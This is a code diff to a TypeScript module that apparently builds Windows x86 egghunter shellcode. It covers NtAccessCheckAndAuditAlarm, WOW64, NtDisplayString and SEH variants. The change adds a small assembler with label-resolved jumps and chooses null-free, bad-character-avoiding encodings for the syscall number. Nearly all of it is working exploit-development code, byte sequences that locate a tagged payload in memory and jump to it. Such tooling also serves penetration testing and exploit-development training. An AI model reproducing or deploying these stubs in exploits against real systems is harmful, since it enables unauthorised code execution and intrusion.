@@ -102,148 +102,202 @@ function resolveSyscall(kind: StubKind, os: string | null, syscall: number | nul
   };
 }
 
-// NtAccessCheckAndAuditAlarm egghunter (INT 0x2E). 34 bytes.
-// Scans page-by-page using the syscall for access checks, then dword-by-dword
-// with scasd for double-tag matching.
-// Uses mov eax,imm32 for the syscall number so it works with any value
-// (Win10 builds use 0x1C9+, which doesn't fit in push imm8).
-// Syscall number at offset 8, tag at offset 20.
-const NTACCESS_X86: number[] = [
-  0x66, 0x81, 0xca, 0xff, 0x0f, // or dx, 0x0fff
-  0x42,                         // inc edx
-  0x52,                         // push edx
-  0xb8, 0xc9, 0x01, 0x00, 0x00, // mov eax, 0x1C9
-  0xcd, 0x2e,                   // int 0x2e
-  0x3c, 0x05,                   // cmp al, 0x5
-  0x5a,                         // pop edx
-  0x74, 0xed,                   // je short (back to or dx)
-  0xb8, 0x54, 0x30, 0x30, 0x57, // mov eax, <TAG>
-  0x8b, 0xfa,                   // mov edi, edx
-  0xaf,                         // scasd
-  0x75, 0xe8,                   // jne short (back to inc edx)
-  0xaf,                         // scasd
-  0x75, 0xe5,                   // jne short (back to inc edx)
-  0xff, 0xe7,                   // jmp edi
-];
+// A stub is a list of instruction bytes, labels, and branches resolved against the
+// labels, so the jump displacements follow the length of the syscall sequence.
+type Asm =
+  | number[]
+  | { label: string }
+  | { jcc: number; to: string } // short jump: opcode, rel8
+  | { call: string } // call rel32
+  | { gap: [string, string] }; // one byte: offset of the second label minus the first
+
+function asmSize(item: Asm): number {
+  if (Array.isArray(item)) return item.length;
+  if ("label" in item) return 0;
+  if ("jcc" in item) return 2;
+  if ("call" in item) return 5;
+  return 1;
+}
+
+function assemble(items: Asm[]): number[] {
+  const labels = new Map<string, number>();
+  let offset = 0;
+  for (const item of items) {
+    if (!Array.isArray(item) && "label" in item) labels.set(item.label, offset);
+    offset += asmSize(item);
+  }
+  const at = (name: string): number => {
+    const value = labels.get(name);
+    if (value === undefined) throw new Error(`egghunter stub has no label ${name}`);
+    return value;
+  };
+  const bytes: number[] = [];
+  for (const item of items) {
+    const next = bytes.length + asmSize(item);
+    if (Array.isArray(item)) {
+      bytes.push(...item);
+    } else if ("jcc" in item) {
+      const rel = at(item.to) - next;
+      if (rel < -0x80 || rel > 0x7f) throw new Error(`short jump to ${item.to} out of range (${rel})`);
+      bytes.push(item.jcc, rel & 0xff);
+    } else if ("call" in item) {
+      bytes.push(0xe8, ...dwordLE(at(item.call) - next));
+    } else if ("gap" in item) {
+      const gap = at(item.gap[1]) - at(item.gap[0]);
+      if (gap < 1 || gap > 0x7f) throw new Error(`gap ${item.gap.join("-")} does not fit imm8 (${gap})`);
+      bytes.push(gap);
+    }
+  }
+  return bytes;
+}
+
+// Ways to load a syscall number into eax, null-free forms first. The stub takes the
+// first one that avoids 0x00 and the bad characters, so the number never forces a null.
+function movEaxCandidates(value: number): number[][] {
+  const v = value >>> 0;
+  const lo = v & 0xff;
+  const hi = (v >>> 8) & 0xff;
+  const candidates: number[][] = [];
+  if (v === 0) candidates.push([0x31, 0xc0]); // xor eax, eax
+  else if (v <= 0x7f) candidates.push([0x6a, v, 0x58]); // push imm8 ; pop eax
+  else if (v <= 0xff) candidates.push([0x31, 0xc0, 0xb0, v]); // xor eax, eax ; mov al, imm8
+  else if (v <= 0xffff && lo === 0) candidates.push([0x31, 0xc0, 0xb4, hi]); // xor eax, eax ; mov ah, imm8
+  else if (v <= 0xffff) candidates.push([0x31, 0xc0, 0x66, 0xb8, lo, hi]); // xor eax, eax ; mov ax, imm16
+  candidates.push([0xb8, ...dwordLE(v)]); // mov eax, imm32
+  candidates.push([0xb8, ...dwordLE(~v >>> 0), 0xf7, 0xd0]); // mov eax, ~imm32 ; not eax
+  return candidates;
+}
+
+function movEax(value: number, badSet: Set<number>): number[] {
+  const candidates = movEaxCandidates(value);
+  return candidates.find((c) => c.every((b) => b !== 0 && !badSet.has(b))) ?? candidates[0];
+}
+
+// NtAccessCheckAndAuditAlarm egghunter (INT 0x2E) for a native 32-bit kernel.
+// Scans page by page using the syscall for access checks, then dword by dword
+// with scasd for the doubled tag. 35 bytes for 0x1C9, 32 for 0x02.
+function ntaccessX86(tag: number[], mov: number[]): Asm[] {
+  return [
+    { label: "page" },
+    [0x66, 0x81, 0xca, 0xff, 0x0f], // or dx, 0x0fff
+    { label: "addr" },
+    [0x42],                         // inc edx
+    [0x52],                         // push edx
+    mov,                            // eax = syscall number
+    [0xcd, 0x2e],                   // int 0x2e
+    [0x3c, 0x05],                   // cmp al, 0x5
+    [0x5a],                         // pop edx
+    { jcc: 0x74, to: "page" },      // je page
+    [0xb8, ...tag],                 // mov eax, <TAG>
+    [0x8b, 0xfa],                   // mov edi, edx
+    [0xaf],                         // scasd
+    { jcc: 0x75, to: "addr" },      // jne addr
+    [0xaf],                         // scasd
+    { jcc: 0x75, to: "addr" },      // jne addr
+    [0xff, 0xe7],                   // jmp edi
+  ];
+}
 
 // WOW64 variant. int 0x2e in a WOW64 process raises STATUS_ILLEGAL_INSTRUCTION,
 // so this stub calls the 64-bit service through the WOW64 gate at fs:[0xC0], as the
 // 32-bit ntdll does on Windows 10 and 11 (mov eax, 0x29 ; call Wow64SystemServiceCall).
 // The gate reads arguments from [esp+8]: the stub pushes the probed address twice
 // (return-address slot and SubsystemName) above ten zeroed arguments, and gets
-// STATUS_ACCESS_VIOLATION (al = 5) when the address is not readable.
-// Syscall number at offset 23, tag at offset 37. 51 bytes.
-const NTACCESS_WOW64: number[] = [
-  0x33, 0xdb,                   // xor ebx, ebx
-  0x53, 0x53, 0x53, 0x53, 0x53, // push ebx x10 (zeroed arguments 2-11)
-  0x53, 0x53, 0x53, 0x53, 0x53,
-  0xb3, 0xc0,                   // mov bl, 0xc0
-  0x66, 0x81, 0xca, 0xff, 0x0f, // or dx, 0x0fff
-  0x42,                         // inc edx
-  0x52,                         // push edx (SubsystemName = probed address)
-  0x52,                         // push edx (return-address slot)
-  0xb8, 0x29, 0x00, 0x00, 0x00, // mov eax, 0x29
-  0x64, 0xff, 0x13,             // call dword ptr fs:[ebx]
-  0x5a,                         // pop edx
-  0x5a,                         // pop edx
-  0x3c, 0x05,                   // cmp al, 0x5
-  0x74, 0xea,                   // je short (back to or dx)
-  0xb8, 0x54, 0x30, 0x30, 0x57, // mov eax, <TAG>
-  0x8b, 0xfa,                   // mov edi, edx
-  0xaf,                         // scasd
-  0x75, 0xe5,                   // jne short (back to inc edx)
-  0xaf,                         // scasd
-  0x75, 0xe2,                   // jne short (back to inc edx)
-  0xff, 0xe7,                   // jmp edi
-];
+// STATUS_ACCESS_VIOLATION (al = 5) when the address is not readable. 49 bytes with 0x29.
+function ntaccessWow64(tag: number[], mov: number[]): Asm[] {
+  return [
+    [0x33, 0xdb],                   // xor ebx, ebx
+    [0x53, 0x53, 0x53, 0x53, 0x53], // push ebx x10 (zeroed arguments 2-11)
+    [0x53, 0x53, 0x53, 0x53, 0x53],
+    [0xb3, 0xc0],                   // mov bl, 0xc0
+    { label: "page" },
+    [0x66, 0x81, 0xca, 0xff, 0x0f], // or dx, 0x0fff
+    { label: "addr" },
+    [0x42],                         // inc edx
+    [0x52],                         // push edx (SubsystemName = probed address)
+    [0x52],                         // push edx (return-address slot)
+    mov,                            // eax = syscall number
+    [0x64, 0xff, 0x13],             // call dword ptr fs:[ebx]
+    [0x5a],                         // pop edx
+    [0x5a],                         // pop edx
+    [0x3c, 0x05],                   // cmp al, 0x5
+    { jcc: 0x74, to: "page" },      // je page
+    [0xb8, ...tag],                 // mov eax, <TAG>
+    [0x8b, 0xfa],                   // mov edi, edx
+    [0xaf],                         // scasd
+    { jcc: 0x75, to: "addr" },      // jne addr
+    [0xaf],                         // scasd
+    { jcc: 0x75, to: "addr" },      // jne addr
+    [0xff, 0xe7],                   // jmp edi
+  ];
+}
 
 // NtDisplayString egghunter (INT 0x2E). 32 bytes.
-// Classic Skape variant: uses `push imm8 ; pop eax` for the syscall number
-// instead of `mov eax, imm32`, saving 2 bytes and avoiding the null bytes
-// that plague small syscall numbers in the imm32 encoding. Only works when
-// the syscall number fits in a signed byte (0x01-0x7F), which holds up to
-// Windows 7; Windows 8 and later need the ntaccess mode.
-// Syscall byte at offset 8, tag at offset 18.
-const NTDISPLAY_X86: number[] = [
-  0x66, 0x81, 0xca, 0xff, 0x0f, // or dx, 0x0fff
-  0x42,                         // inc edx
-  0x52,                         // push edx
-  0x6a, 0x43,                   // push 0x43  (NtDisplayString syscall)
-  0x58,                         // pop eax
-  0xcd, 0x2e,                   // int 0x2e
-  0x3c, 0x05,                   // cmp al, 0x5
-  0x5a,                         // pop edx
-  0x74, 0xef,                   // je short (back to or dx)
-  0xb8, 0x54, 0x30, 0x30, 0x57, // mov eax, <TAG>
-  0x8b, 0xfa,                   // mov edi, edx
-  0xaf,                         // scasd
-  0x75, 0xea,                   // jne short (back to inc edx)
-  0xaf,                         // scasd
-  0x75, 0xe7,                   // jne short (back to inc edx)
-  0xff, 0xe7,                   // jmp edi
-];
+// Classic Skape variant with `push imm8 ; pop eax`. It only takes numbers that fit
+// a signed byte (0x01-0x7F), which holds up to Windows 7; later builds need ntaccess.
+function ntdisplayX86(tag: number[], syscall: number): Asm[] {
+  return [
+    { label: "page" },
+    [0x66, 0x81, 0xca, 0xff, 0x0f], // or dx, 0x0fff
+    { label: "addr" },
+    [0x42],                         // inc edx
+    [0x52],                         // push edx
+    [0x6a, syscall, 0x58],          // push imm8 ; pop eax
+    [0xcd, 0x2e],                   // int 0x2e
+    [0x3c, 0x05],                   // cmp al, 0x5
+    [0x5a],                         // pop edx
+    { jcc: 0x74, to: "page" },      // je page
+    [0xb8, ...tag],                 // mov eax, <TAG>
+    [0x8b, 0xfa],                   // mov edi, edx
+    [0xaf],                         // scasd
+    { jcc: 0x75, to: "addr" },      // jne addr
+    [0xaf],                         // scasd
+    { jcc: 0x75, to: "addr" },      // jne addr
+    [0xff, 0xe7],                   // jmp edi
+  ];
+}
 
-const TAG_OFFSET_NTDISPLAY = 18;
-const SYSCALL_OFFSET_NTDISPLAY = 8;
-
-// SEH-based egghunter. 70 bytes. Position-independent via call $+5/pop.
-// Installs a custom exception handler that catches ACCESS_VIOLATION from scasd
-// and resumes at the next page. No syscall-number dependency, so it's portable
-// across Windows versions.
-//
-// Layout:
-//   [0x00] jmp short install_seh (skip handler)
-//   [0x02] handler: reads ContextRecord from stdcall args, computes scan_loop
-//          address from EstablisherFrame→Handler, sets Eip, returns
-//          EXCEPTION_CONTINUE_EXECUTION.
-//   [0x19] install_seh: gets handler address via call/pop, installs SEH frame.
-//   [0x2D] scan_loop: or di,0xfff (handler resumes here → next page)
-//   [0x32] next_addr: inc edi (jnz resumes here → next dword)
-//          mov eax, TAG; scasd; jnz next_addr; scasd; jnz next_addr;
-//          restore old SEH; jmp edi.
-//
-// Tag at offset 0x34. Contains null bytes (offsets 0x13-0x15, 0x1C-0x1F).
-const SEH_EGGHUNTER: number[] = [
-  // jmp short install_seh
-  0xeb, 0x17,
-  // handler (offset 0x02, 23 bytes)
-  0x8b, 0x4c, 0x24, 0x0c,             // mov ecx, [esp+0x0C]      (ContextRecord)
-  0x8b, 0x44, 0x24, 0x08,             // mov eax, [esp+0x08]      (EstablisherFrame)
-  0x8b, 0x40, 0x04,                   // mov eax, [eax+0x04]      (handler address)
-  0x83, 0xc0, 0x2b,                   // add eax, 0x2B            (scan_loop = handler+43)
-  0x89, 0x81, 0xb8, 0x00, 0x00, 0x00, // mov [ecx+0xB8], eax     (set Eip = scan_loop)
-  0x31, 0xc0,                         // xor eax, eax             (EXCEPTION_CONTINUE_EXECUTION)
-  0xc3,                               // ret
-  // install_seh (offset 0x19)
-  0x31, 0xd2,                         // xor edx, edx
-  0xe8, 0x00, 0x00, 0x00, 0x00,       // call $+5
-  0x5e,                               // pop esi                  (esi = addr of this pop)
-  0x83, 0xee, 0x1e,                   // sub esi, 0x1E            (esi = handler addr)
-  0x56,                               // push esi                 (handler)
-  0x64, 0xff, 0x32,                   // push dword ptr fs:[edx]  (old SEH)
-  0x64, 0x89, 0x22,                   // mov dword ptr fs:[edx], esp
-  0x31, 0xff,                         // xor edi, edi             (scan from 0)
-  // scan_loop (offset 0x2D) — handler resumes here (next page)
-  0x66, 0x81, 0xcf, 0xff, 0x0f,       // or di, 0x0FFF
-  // next_addr (offset 0x32) — jnz resumes here (next dword)
-  0x47,                               // inc edi
-  0xb8, 0x54, 0x30, 0x30, 0x57,       // mov eax, <TAG>           (tag at offset 0x34)
-  0xaf,                               // scasd
-  0x75, 0xf7,                         // jnz next_addr            (0x32)
-  0xaf,                               // scasd
-  0x75, 0xf4,                         // jnz next_addr            (0x32)
-  // found — restore old SEH and jump
-  0x64, 0x8f, 0x02,                   // pop dword ptr fs:[edx]
-  0x83, 0xc4, 0x04,                   // add esp, 0x04
-  0xff, 0xe7,                         // jmp edi
-];
-
-const TAG_OFFSET_NTACCESS = 20;
-const TAG_OFFSET_NTACCESS_WOW64 = 37;
-const TAG_OFFSET_SEH = 0x34;
-
-const SYSCALL_OFFSET_NTACCESS = 8;
-const SYSCALL_OFFSET_NTACCESS_WOW64 = 23;
+// SEH-based egghunter. 67 bytes, null-free. No syscall number, so it is portable
+// across Windows versions. It installs an exception handler that catches the access
+// violation from scasd and resumes at the next page. The handler sits after a backward
+// call, so the return address is the handler and the rel32 is negative instead of the
+// zeros of call $+5. CONTEXT.Eip (offset 0xB8) is written as [ecx+0x7F+0x39] to keep
+// the displacement byte-sized.
+function sehX86(tag: number[]): Asm[] {
+  return [
+    { jcc: 0xeb, to: "getpc" },     // jmp short getpc
+    { label: "install" },
+    [0x5e],                         // pop esi (handler)
+    [0x31, 0xd2],                   // xor edx, edx
+    [0x56],                         // push esi (Handler)
+    [0x64, 0xff, 0x32],             // push dword ptr fs:[edx] (Next = old SEH)
+    [0x64, 0x89, 0x22],             // mov dword ptr fs:[edx], esp
+    [0x31, 0xff],                   // xor edi, edi (scan from 0)
+    { label: "page" },
+    [0x66, 0x81, 0xcf, 0xff, 0x0f], // or di, 0x0fff (the handler resumes here)
+    { label: "addr" },
+    [0x47],                         // inc edi
+    [0xb8, ...tag],                 // mov eax, <TAG>
+    [0xaf],                         // scasd
+    { jcc: 0x75, to: "addr" },      // jnz addr
+    [0xaf],                         // scasd
+    { jcc: 0x75, to: "addr" },      // jnz addr
+    [0x64, 0x8f, 0x02],             // pop dword ptr fs:[edx] (restore old SEH)
+    [0x83, 0xc4, 0x04],             // add esp, 4
+    [0xff, 0xe7],                   // jmp edi
+    { label: "getpc" },
+    { call: "install" },            // call install (pushes the handler address)
+    { label: "handler" },
+    [0x8b, 0x4c, 0x24, 0x0c],       // mov ecx, [esp+0xc] (ContextRecord)
+    [0x8b, 0x44, 0x24, 0x08],       // mov eax, [esp+0x8] (EstablisherFrame)
+    [0x8b, 0x40, 0x04],             // mov eax, [eax+0x4] (Handler)
+    [0x83, 0xe8], { gap: ["page", "handler"] }, // sub eax, handler - page
+    [0x83, 0xc1, 0x7f],             // add ecx, 0x7f
+    [0x89, 0x41, 0x39],             // mov [ecx+0x39], eax (CONTEXT.Eip = page)
+    [0x31, 0xc0],                   // xor eax, eax (ExceptionContinueExecution)
+    [0xc3],                         // ret
+  ];
+}
 
 function uniqueBytes(values: number[] | undefined): number[] {
   const seen = new Set<number>();
@@ -280,62 +334,43 @@ export type EgghunterResult = {
   osWarning: string | null;
 };
 
+
 export function buildEgghunter(options: EggOptions): EgghunterResult {
   const tag = tagBytes(options.tag);
   const badSet = new Set(uniqueBytes(options.badchars));
 
-  let template: number[];
-  let tagOffset: number;
-  let syscallOffset: number | null = null;
-  let kind: StubKind | null = null;
+  let items: Asm[];
   let label: string;
+  let resolved: ResolvedSyscall | null = null;
 
   if (options.mode === "seh") {
-    template = [...SEH_EGGHUNTER];
-    tagOffset = TAG_OFFSET_SEH;
+    items = sehX86(tag);
     label = "seh egghunter";
   } else if (options.mode === "ntdisplay") {
     if (options.wow64) {
       throw new Error('ntdisplay has no WOW64 stub: int 0x2e raises STATUS_ILLEGAL_INSTRUCTION in a WOW64 process. Use mode "ntaccess" with wow64 = true.');
     }
-    template = [...NTDISPLAY_X86];
-    tagOffset = TAG_OFFSET_NTDISPLAY;
-    syscallOffset = SYSCALL_OFFSET_NTDISPLAY;
-    kind = "ntdisplay32";
+    resolved = resolveSyscall("ntdisplay32", options.os, options.syscall);
+    if (resolved.number < 0x01 || resolved.number > 0x7f) {
+      throw new Error(`NtDisplayString number ${hex(resolved.number)} (${resolved.source}) does not fit the push imm8 in the ntdisplay stub (0x01-0x7F). Use mode "ntaccess".`);
+    }
+    items = ntdisplayX86(tag, resolved.number);
     label = "ntdisplay egghunter";
   } else if (options.wow64) {
-    template = [...NTACCESS_WOW64];
-    tagOffset = TAG_OFFSET_NTACCESS_WOW64;
-    syscallOffset = SYSCALL_OFFSET_NTACCESS_WOW64;
-    kind = "ntaccess64";
+    resolved = resolveSyscall("ntaccess64", options.os, options.syscall);
+    items = ntaccessWow64(tag, movEax(resolved.number, badSet));
     label = "ntaccess wow64 egghunter";
   } else {
-    template = [...NTACCESS_X86];
-    tagOffset = TAG_OFFSET_NTACCESS;
-    syscallOffset = SYSCALL_OFFSET_NTACCESS;
-    kind = "ntaccess32";
+    resolved = resolveSyscall("ntaccess32", options.os, options.syscall);
+    items = ntaccessX86(tag, movEax(resolved.number, badSet));
     label = "ntaccess egghunter";
   }
 
-  template.splice(tagOffset, 4, ...tag);
-
-  let resolved: ResolvedSyscall | null = null;
-  if (syscallOffset !== null && kind !== null) {
-    resolved = resolveSyscall(kind, options.os, options.syscall);
-    if (kind === "ntdisplay32") {
-      if (resolved.number < 0x01 || resolved.number > 0x7f) {
-        throw new Error(`NtDisplayString number ${hex(resolved.number)} (${resolved.source}) does not fit the push imm8 in the ntdisplay stub (0x01-0x7F). Use mode "ntaccess".`);
-      }
-      template.splice(syscallOffset, 1, resolved.number);
-    } else {
-      template.splice(syscallOffset, 4, ...dwordLE(resolved.number));
-    }
-  }
-
-  const badcharHits = checkBadchars(template, label, badSet);
+  const bytes = assemble(items);
+  const badcharHits = checkBadchars(bytes, label, badSet);
   return {
-    bytes: template,
-    size: template.length,
+    bytes,
+    size: bytes.length,
     badcharHits,
     syscallUsed: resolved?.number ?? null,
     syscallSource: resolved?.source ?? null,
